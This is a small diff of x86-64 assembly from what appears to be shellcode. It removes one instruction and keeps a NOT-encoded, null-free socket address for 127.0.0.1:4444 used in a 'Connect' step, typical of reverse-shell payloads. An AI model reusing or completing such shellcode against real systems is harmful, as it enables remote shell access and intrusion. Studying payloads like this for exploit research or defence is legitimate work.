@@ -37,7 +37,6 @@ _start:
 	syscall
 ; Connect
 	xchg edi, eax
-	push rdx
 	mov rbx, 0xfeffff80a3eefffd ; not encoded 0x0100007f5c110002
 	not rbx
 	push rbx
